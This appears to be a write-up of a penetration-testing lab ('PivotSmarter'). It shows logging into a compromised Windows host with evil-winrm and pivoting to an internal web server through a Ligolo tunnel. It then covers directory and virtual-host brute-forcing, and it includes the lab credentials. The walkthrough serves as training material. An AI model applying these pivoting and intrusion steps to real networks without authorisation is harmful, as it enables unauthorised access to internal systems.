# PivotSmarter

## PivotSmarter

![image.png](<../.gitbook/assets/image (11).png>)

## **Scope and Objectives**

#### **Objective:**

You're a **penetration tester** on the **Hack Smarter Red Team**. During the engagement, you have discovered credentials for a web server but your attack machine does not have direct access to the server.

#### **Goal:**

You have already compromised a Windows Server providing you access to the internal network. Connect to this machine with `evil-winrm`. Use this Windows Server as a proxy to access the web server from your attack machine, login w/ the credentials, and retrieve the final flag

Windows Server - Credentials `10.1.108.74`

```bash
j.smith
HackSmarter123
```

**Web Server - Credentials `10.1.236.3`**

```bash
t.ramsbey
HackSmarter123321123
```

### Windows Server Access

```bash
evil-winrm -i 10.1.108.74 -u j.smith -p HackSmarter123
```

![image.png](<../.gitbook/assets/image 1 (10).png>)

* We have successfully compromised the Windows server and now we need to pivot to the Web Server

### **Web Server Access**

![image.png](<../.gitbook/assets/image 2 (10).png>)

* We can confirm that we do not have a direct access to the web server
* Lets do some pivoting with Ligolo

_**On my Virtual Machine**_

```bash
sudo ip tuntap add user RedBlue mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Setup the route ***10.1.236.**0/24* on another terminal
sudo ip route add ***10.1.236.**0/24* dev ligolo
sudo ip route add 240.0.0.1 dev ligolo

#Start the session
start

```

_**Attacking machine \_ using agent**_

```bash
#Set the Ligolo agent
./agent -connect 10.200.40.60:11601 -ignore-cert

```

![image.png](<../.gitbook/assets/image 3 (10).png>)

#### Web Application Enumeration

![image.png](<../.gitbook/assets/image 4 (10).png>)

_**Directory Brute-forcing**_

```bash
dirsearch -u http://***10.1.236.3*** -t 5

ffuf -u "http://***10.1.236.3***/FUZZ" -w /opt/SecLists/common/raft-medium-directories.txt -r -recursion 

gobuster dir -u http://***10.1.236.3*** -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip
```

![image.png](<../.gitbook/assets/image 5 (10).png>)

![image.png](<../.gitbook/assets/image 6 (10).png>)

![image.png](<../.gitbook/assets/image 7 (10).png>)

_**Subdomains and Virtual Hosts**_

```bash
./vhost-fuzzer.sh web.server /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://web.server 1

ffuf -u http:/web.server -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$DOMAIN"
```

![image.png](<../.gitbook/assets/image 8 (10).png>)
